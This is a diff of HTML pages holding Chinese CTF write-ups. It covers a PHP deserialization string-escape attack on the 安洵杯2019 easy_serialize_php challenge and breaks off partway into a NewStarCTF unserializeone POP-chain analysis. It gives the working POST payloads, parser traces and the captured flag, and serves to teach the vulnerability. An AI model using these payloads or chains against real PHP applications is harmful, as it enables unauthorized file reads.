-<div class="language-php highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a><span class="x">if(!$_GET['img_path']){</span>
-</span><span id="__span-78-2"><a id="__codelineno-78-2" name="__codelineno-78-2" href="#__codelineno-78-2"></a><span class="x">    $_SESSION['img'] = base64_encode('guest_img.png');</span>
-</span><span id="__span-78-3"><a id="__codelineno-78-3" name="__codelineno-78-3" href="#__codelineno-78-3"></a><span class="x">}else{</span>
-</span><span id="__span-78-4"><a id="__codelineno-78-4" name="__codelineno-78-4" href="#__codelineno-78-4"></a><span class="x">    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));</span>
-</span><span id="__span-78-5"><a id="__codelineno-78-5" name="__codelineno-78-5" href="#__codelineno-78-5"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="x">if(!$_GET['img_path']){</span>
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a><span class="x">    $_SESSION['img'] = base64_encode('guest_img.png');</span>
+</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a><span class="x">}else{</span>
+</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a><span class="x">    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));</span>
+</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a><span class="x">}</span>
 </span></code></pre></div>
 <p><strong>所以你 POST 里传的 <code>img</code> 会被覆盖掉；<code>sha1()</code> 的输出又永远是 40 位十六进制，</strong>注入不进去任何结构<strong>。</strong></p>
 <p><strong>这条路封死。真正的入口是 <code>filter()</code>——它会把序列化串里的 <code>php</code>、<code>flag</code> 删掉。</strong></p>
 <h4 id="step-3"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#step-3">Step 3：错位从这里开始</a></h4>
 <p><strong><code>serialize()</code> 里的长度声明是</strong>按过滤前的内容算<strong>的，但 <code>filter()</code> 之后内容变短了：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a>序列化：s:7:"phpflag";     ← 声明读 7 个字节
-</span><span id="__span-79-2"><a id="__codelineno-79-2" name="__codelineno-79-2" href="#__codelineno-79-2"></a>过滤后：s:7:"";            ← 内容被删光，0 个字节
+<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>序列化：s:7:"phpflag";     ← 声明读 7 个字节
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>过滤后：s:7:"";            ← 内容被删光，0 个字节
 </span></code></pre></div>
 <p><strong>解析器不会报错，它按规则</strong>从引号后面数 7 个字节<strong>——数到的是后面那段内容。</strong></p>
 <p><strong>这就是“逃逸”：长度声明和实际内容不匹配，解析器多读的那部分，变成了下一个结构。</strong></p>
 <h4 id="step-4-payload"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#step-4-payload">Step 4：我把 payload 放错了位置（三次错）</a></h4>
 <p><strong>① 填充放在</strong>值<strong>里——废</strong></p>
 <p><strong>我把 <code>php</code> 重复十几次塞进 <code>user</code> 的值里，想让 filter 删掉它们。</strong>结果：**</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a>过滤前: s:4:"user";s:89:"guestphpphp…php";}s:3:"img";…"
-</span><span id="__span-80-2"><a id="__codelineno-80-2" name="__codelineno-80-2" href="#__codelineno-80-2"></a>过滤后: s:4:"user";s:89:"guest";}s:3:"img";…"
-</span><span id="__span-80-3"><a id="__codelineno-80-3" name="__codelineno-80-3" href="#__codelineno-80-3"></a>                     └ 声明 89，实际只剩 47 ┘
+<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>过滤前: s:4:"user";s:89:"guestphpphp…php";}s:3:"img";…"
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>过滤后: s:4:"user";s:89:"guest";}s:3:"img";…"
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>                     └ 声明 89，实际只剩 47 ┘
 </span></code></pre></div>
 <p><strong>解析器从 <code>guest</code> 往后数 89 个字节，把我写的 <code>";}s:3:"img";...</code> <strong>全算进了 user 的值里</strong>——我写的结构一次都没被当成结构，只是被当成字符。<code>unserialize</code> 返回 <code>false</code>。</strong></p>
 <p><strong>② 填充放在</strong>键名<strong>里——对</strong></p>
 <p><strong>键名的写法也是 <code>s:N:"键名"</code>，同样有长度声明，同样会被删：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a>过滤前: s:7:"phpflag";s:48:";s:1:"1";s:3:"img";s:20:"ZDBn…";}"
-</span><span id="__span-81-2"><a id="__codelineno-81-2" name="__codelineno-81-2" href="#__codelineno-81-2"></a>过滤后: s:7:"";s:48:";s:1:"1";s:3:"img";s:20:"ZDBn…";}"
+<div class="language-text highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>过滤前: s:7:"phpflag";s:48:";s:1:"1";s:3:"img";s:20:"ZDBn…";}"
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>过滤后: s:7:"";s:48:";s:1:"1";s:3:"img";s:20:"ZDBn…";}"
 </span></code></pre></div>
 <p><strong>这次断的是</strong>键名和值的交界处<strong>，值本身是完整的。解析器从值里借 7 个字节当键名，剩下的部分就变成了</strong>新的结构<strong>。</strong></p>
 <p><strong>③ 还手写过整条序列化串——那也是错的</strong></p>
 <p><strong>这题</strong>不需要你写序列化串<strong>。<code>serialize($_SESSION)</code> 是服务器自己做的。我一开始写成这样：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a>O:7:"Session":3:{s:4:"user";…}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>O:7:"Session":3:{s:4:"user";…}
 </span></code></pre></div>
 <p><strong>两个问题：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a>O: 是对象格式，$_SESSION 是数组，应该是 a:
-</span><span id="__span-83-2"><a id="__codelineno-83-2" name="__codelineno-83-2" href="#__codelineno-83-2"></a>没有 Session 这个类 → 变成 __PHP_Incomplete_Class → 后面不能当数组用
+<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>O: 是对象格式，$_SESSION 是数组，应该是 a:
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>没有 Session 这个类 → 变成 __PHP_Incomplete_Class → 后面不能当数组用
 </span></code></pre></div>
 <p><strong>你的 payload 只是 POST 里的</strong>一个字符串值<strong>。</strong></p>
 <h4 id="step-5"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#step-5">Step 5：参数名也写错了</a></h4>
 <p><strong>我写的是 <code>$_SESSION['flag']=...</code>——这是 PHP 语法，不是 HTTP 参数名。</strong></p>
 <p><strong>HTTP 里要写：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a>_SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>_SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
 </span></code></pre></div>
 <p><strong>注意这里没有 <code>$</code>、没有单引号。</strong></p>
 <h4 id="step-6-2"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#step-6-2">Step 6：一个意外发现——数组只剩 2 个元素</a></h4>
 <p><strong><code>extract($_POST)</code> 把 <code>_POST['_SESSION']</code> 这个</strong>数组<strong>整体赋给了 <code>$_SESSION</code>，</strong>不是往里面加键，而是整个替换掉<strong>。</strong></p>
 <p><strong>所以服务器真正的序列化串是：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a>a:2:{s:7:"phpflag";s:48:";s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>a:2:{s:7:"phpflag";s:48:";s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
 </span></code></pre></div>
 <p><strong>只有 2 个元素：我的键 + img。<code>user</code> 和 <code>function</code> 已经不存在了。</strong></p>
 <p><strong>这也解释了那个 <code>;s:1:"1";</code> 是干什么的——占一个元素的位置，让解析出来的元素数正好等于 <code>a:2:</code> 声明的 2 个。</strong></p>
 <h4 id="step-7"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#step-7">Step 7：逐字节看解析过程</a></h4>
 <p><strong>过滤后的串：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a>a:2:{s:7:"";s:48:";s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>a:2:{s:7:"";s:48:";s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
 </span></code></pre></div>
 <p><strong>解析器这样走：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a>① a:2:{                    → 要读 2 组键值对
-</span><span id="__span-87-2"><a id="__codelineno-87-2" name="__codelineno-87-2" href="#__codelineno-87-2"></a>② 读第 1 组的键:  s:7  →  从引号后数 7 个字节 = '";s:48:'
-</span><span id="__span-87-3"><a id="__codelineno-87-3" name="__codelineno-87-3" href="#__codelineno-87-3"></a>③ 读第 1 组的值:  s:1  →  读 1 个字节 = '1'
-</span><span id="__span-87-4"><a id="__codelineno-87-4" name="__codelineno-87-4" href="#__codelineno-87-4"></a>④ 读第 2 组的键:  s:3  →  'img'
-</span><span id="__span-87-5"><a id="__codelineno-87-5" name="__codelineno-87-5" href="#__codelineno-87-5"></a>⑤ 读第 2 组的值:  s:20 →  'ZDBnM19mMWFnLnBocA=='
-</span><span id="__span-87-6"><a id="__codelineno-87-6" name="__codelineno-87-6" href="#__codelineno-87-6"></a>⑥ 读到 '}'，结束。后面那段"真正的 img"被丢弃
+<div class="language-text highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>① a:2:{                    → 要读 2 组键值对
+</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>② 读第 1 组的键:  s:7  →  从引号后数 7 个字节 = '";s:48:'
+</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a>③ 读第 1 组的值:  s:1  →  读 1 个字节 = '1'
+</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a>④ 读第 2 组的键:  s:3  →  'img'
+</span><span id="__span-49-5"><a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a>⑤ 读第 2 组的值:  s:20 →  'ZDBnM19mMWFnLnBocA=='
+</span><span id="__span-49-6"><a id="__codelineno-49-6" name="__codelineno-49-6" href="#__codelineno-49-6"></a>⑥ 读到 '}'，结束。后面那段"真正的 img"被丢弃
 </span></code></pre></div>
 <p><strong>最终：<code>$userinfo['img'] = 'ZDBnM19mMWFnLnBocA=='</code>。</strong></p>
 <p><strong>第一步最关键：<code>phpflag</code> 被删光，但 <code>s:7</code> 的声明还在，解析器不会“觉得不对”，它只是从下一个字节开始数 7 个。</strong></p>
 <h4 id="step-8"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#step-8">Step 8：读文件</a></h4>
 <p><strong><code>ZDBnM19mMWFnLnBocA==</code> 解出来是 <code>d0g3_f1ag.php</code>：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a>file_get_contents(base64_decode('ZDBnM19mMWFnLnBocA=='))
-</span><span id="__span-88-2"><a id="__codelineno-88-2" name="__codelineno-88-2" href="#__codelineno-88-2"></a>→ &lt;?php $flag = 'flag in /d0g3_fllllllag'; ?&gt;
+<div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>file_get_contents(base64_decode('ZDBnM19mMWFnLnBocA=='))
+</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>→ &lt;?php $flag = 'flag in /d0g3_fllllllag'; ?&gt;
 </span></code></pre></div>
 <p><strong>真正的 flag 在 <code>/d0g3_fllllllag</code>，重新算 base64：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a>/d0g3_fllllllag  →  L2QwZzNfZmxsbGxsbGFn
+<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>/d0g3_fllllllag  →  L2QwZzNfZmxsbGxsbGFn
 </span></code></pre></div>
 <p><strong>再发一次：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a>POST _SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
-</span><span id="__span-90-2"><a id="__codelineno-90-2" name="__codelineno-90-2" href="#__codelineno-90-2"></a>GET  ?f=show_image
+<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>POST _SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
+</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>GET  ?f=show_image
 </span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a>CTF2{dad89ab0-9990-4063-bc5a-fabbcc9cb29e}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>CTF2{dad89ab0-9990-4063-bc5a-fabbcc9cb29e}
 </span></code></pre></div>
 <hr />
 <h3 id="_3"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#_3">解题思路总结</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a>读源码 → sink 在 show_image：unserialize + base64_decode + file_get_contents
-</span><span id="__span-92-2"><a id="__codelineno-92-2" name="__codelineno-92-2" href="#__codelineno-92-2"></a>       → img 被代码无条件覆盖，注入不进去
-</span><span id="__span-92-3"><a id="__codelineno-92-3" name="__codelineno-92-3" href="#__codelineno-92-3"></a>         → 突破口：filter 会删 php/flag，让长度声明和内容不匹配
-</span><span id="__span-92-4"><a id="__codelineno-92-4" name="__codelineno-92-4" href="#__codelineno-92-4"></a>           → 填充放在"值"里 → 解析器把后面的结构一起吞掉（失败）
-</span><span id="__span-92-5"><a id="__codelineno-92-5" name="__codelineno-92-5" href="#__codelineno-92-5"></a>             → 填充放在"键名"里 → 断点落在键名/值交界，落点可控（成功）
-</span><span id="__span-92-6"><a id="__codelineno-92-6" name="__codelineno-92-6" href="#__codelineno-92-6"></a>               → 补一个假元素 ;s:1:"1"; 让元素数对上 a:2
-</span><span id="__span-92-7"><a id="__codelineno-92-7" name="__codelineno-92-7" href="#__codelineno-92-7"></a>                 → 读出 d0g3_f1ag.php → 里面写着真实路径 → 再来一次
+<div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>读源码 → sink 在 show_image：unserialize + base64_decode + file_get_contents
+</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a>       → img 被代码无条件覆盖，注入不进去
+</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a>         → 突破口：filter 会删 php/flag，让长度声明和内容不匹配
+</span><span id="__span-54-4"><a id="__codelineno-54-4" name="__codelineno-54-4" href="#__codelineno-54-4"></a>           → 填充放在"值"里 → 解析器把后面的结构一起吞掉（失败）
+</span><span id="__span-54-5"><a id="__codelineno-54-5" name="__codelineno-54-5" href="#__codelineno-54-5"></a>             → 填充放在"键名"里 → 断点落在键名/值交界，落点可控（成功）
+</span><span id="__span-54-6"><a id="__codelineno-54-6" name="__codelineno-54-6" href="#__codelineno-54-6"></a>               → 补一个假元素 ;s:1:"1"; 让元素数对上 a:2
+</span><span id="__span-54-7"><a id="__codelineno-54-7" name="__codelineno-54-7" href="#__codelineno-54-7"></a>                 → 读出 d0g3_f1ag.php → 里面写着真实路径 → 再来一次
 </span></code></pre></div>
 <h4 id="_4"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#_4">漏洞原理</a></h4>
 <p><strong>① 长度声明是“过滤前”算的</strong></p>
 <p><strong><code>serialize()</code> 生成的 <code>s:N:"..."</code> 是按当时内容的长度算的；<code>filter()</code> 改了内容，<code>N</code> 却不会变。</strong></p>
 <p><strong>解析器只认 <code>N</code>：它从引号后精确数 <code>N</code> 个字节。</strong>内容短了，它就多读到后面的东西——<strong>多读的部分被当成新结构。</strong></p>
 <p><strong>② 错位点在哪，决定了你能不能控制</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1" href="#__codelineno-93-1"></a>填充在值里   →  值本身断裂，后面全被当字符吞掉  →  不可控
-</span><span id="__span-93-2"><a id="__codelineno-93-2" name="__codelineno-93-2" href="#__codelineno-93-2"></a>填充在键名里 →  值完整，断点落在"键名结束 → 值开始"  →  可控
+<div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>填充在值里   →  值本身断裂，后面全被当字符吞掉  →  不可控
+</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a>填充在键名里 →  值完整，断点落在"键名结束 → 值开始"  →  可控
 </span></code></pre></div>
 <p><strong>③ <code>extract()</code> 同名会整体替换</strong></p>
 <p><strong><code>_POST['_SESSION']</code> 是数组，<code>extract</code> 会把它整个赋给 <code>$_SESSION</code>，</strong>不是合并<strong>。</strong>所以 <code>user</code>、<code>function</code> 消失了，数组只剩你的键和 <code>img</code>。**</p>
@@ -3728,13 +3919,13 @@
 <hr />
 <details class="note">
 <summary>完整 payload</summary>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1" href="#__codelineno-94-1"></a>GET  /index.php?f=show_image
-</span><span id="__span-94-2"><a id="__codelineno-94-2" name="__codelineno-94-2" href="#__codelineno-94-2"></a>
-</span><span id="__span-94-3"><a id="__codelineno-94-3" name="__codelineno-94-3" href="#__codelineno-94-3"></a>POST _SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
-</span><span id="__span-94-4"><a id="__codelineno-94-4" name="__codelineno-94-4" href="#__codelineno-94-4"></a>→ 返回 d0g3_f1ag.php 的内容：$flag = 'flag in /d0g3_fllllllag';
-</span><span id="__span-94-5"><a id="__codelineno-94-5" name="__codelineno-94-5" href="#__codelineno-94-5"></a>
-</span><span id="__span-94-6"><a id="__codelineno-94-6" name="__codelineno-94-6" href="#__codelineno-94-6"></a>POST _SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
-</span><span id="__span-94-7"><a id="__codelineno-94-7" name="__codelineno-94-7" href="#__codelineno-94-7"></a>→ CTF2{dad89ab0-9990-4063-bc5a-fabbcc9cb29e}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>GET  /index.php?f=show_image
+</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a>
+</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a>POST _SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
+</span><span id="__span-56-4"><a id="__codelineno-56-4" name="__codelineno-56-4" href="#__codelineno-56-4"></a>→ 返回 d0g3_f1ag.php 的内容：$flag = 'flag in /d0g3_fllllllag';
+</span><span id="__span-56-5"><a id="__codelineno-56-5" name="__codelineno-56-5" href="#__codelineno-56-5"></a>
+</span><span id="__span-56-6"><a id="__codelineno-56-6" name="__codelineno-56-6" href="#__codelineno-56-6"></a>POST _SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
+</span><span id="__span-56-7"><a id="__codelineno-56-7" name="__codelineno-56-7" href="#__codelineno-56-7"></a>→ CTF2{dad89ab0-9990-4063-bc5a-fabbcc9cb29e}
 </span></code></pre></div>
 </details>
 <details class="note">
@@ -3790,134 +3981,134 @@
 <hr />
 <h3 id="_1"><a class="toclink" href="../../newstarctf-unserializeone/#_1">题目概述</a></h3>
 <p>给一份源码，入口就一句：</p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="x">if(isset($_POST['pop'])){</span>
-</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a><span class="x">    unserialize($_POST['pop']);</span>
-</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="x">if(isset($_POST['pop'])){</span>
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="x">    unserialize($_POST['pop']);</span>
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="x">}</span>
 </span></code></pre></div>
 <p><strong>四个类：<code>Start</code>、<code>Sec</code>、<code>Easy</code>、<code>eeee</code>，各带魔术方法。任务是拼一条从 <code>unserialize</code> 走到 <code>file_get_contents('/flag')</code> 的链。</strong></p>
 <hr />
 <h3 id="_2"><a class="toclink" href="../../newstarctf-unserializeone/#_2">解题过程</a></h3>
 <h4 id="step-1flag"><a class="toclink" href="../../newstarctf-unserializeone/#step-1flag">Step 1：先找终点——flag 在哪被读出来</a></h4>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="x">class Sec{</span>
-</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a><span class="x">    public function __invoke()</span>
-</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a><span class="x">    {</span>
-</span><span id="__span-53-4"><a id="__codelineno-53-4" name="__codelineno-53-4" href="#__codelineno-53-4"></a><span class="x">        echo file_get_contents('/flag');</span>
-</span><span id="__span-53-5"><a id="__codelineno-53-5" name="__codelineno-53-5" href="#__codelineno-53-5"></a><span class="x">    }</span>
-</span><span id="__span-53-6"><a id="__codelineno-53-6" name="__codelineno-53-6" href="#__codelineno-53-6"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="x">class Sec{</span>
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="x">    public function __invoke()</span>
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="x">    {</span>
+</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="x">        echo file_get_contents('/flag');</span>
+</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a><span class="x">    }</span>
+</span><span id="__span-27-6"><a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a><span class="x">}</span>
 </span></code></pre></div>
 <p><strong>终点在 <code>Sec::__invoke()</code>。</strong></p>
 <p><strong><code>__invoke</code> 的触发条件：</strong>把一个对象当成函数来调用<strong>，也就是 <code>$obj()</code>。</strong></p>
 <h4 id="step-2"><a class="toclink" href="../../newstarctf-unserializeone/#step-2">Step 2：谁会把对象当函数调用</a></h4>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="x">class Start{</span>
-</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a><span class="x">    public function __isset($var)</span>
-</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a><span class="x">    {</span>
-</span><span id="__span-54-4"><a id="__codelineno-54-4" name="__codelineno-54-4" href="#__codelineno-54-4"></a><span class="x">        ($this-&gt;func)();</span>
-</span><span id="__span-54-5"><a id="__codelineno-54-5" name="__codelineno-54-5" href="#__codelineno-54-5"></a><span class="x">    }</span>
-</span><span id="__span-54-6"><a id="__codelineno-54-6" name="__codelineno-54-6" href="#__codelineno-54-6"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="x">class Start{</span>
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="x">    public function __isset($var)</span>
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="x">    {</span>
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="x">        ($this-&gt;func)();</span>
+</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a><span class="x">    }</span>
+</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a><span class="x">}</span>
 </span></code></pre></div>
 <p><strong><code>($this-&gt;func)()</code> —— 这就是“把 <code>$this-&gt;func</code> 当函数调用”。只要 <code>$this-&gt;func</code> 是一个 <code>Sec</code> 对象，就会走到 <code>Sec::__invoke</code>。</strong></p>
 <p><strong>所以现在要找：</strong><code>__isset</code> 怎么被触发<strong>。</strong></p>
 <p><strong><code>__isset</code> 的触发条件：</strong>对不可访问或不存在的属性调用 <code>isset()</code>（或 <code>empty()</code>）<strong>。</strong></p>
 <h4 id="step-3-isset"><a class="toclink" href="../../newstarctf-unserializeone/#step-3-isset">Step 3：谁会对不存在的属性调用 isset</a></h4>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="x">class eeee{</span>
-</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a><span class="x">    public $obj;</span>
-</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a><span class="x">    public function __clone()</span>
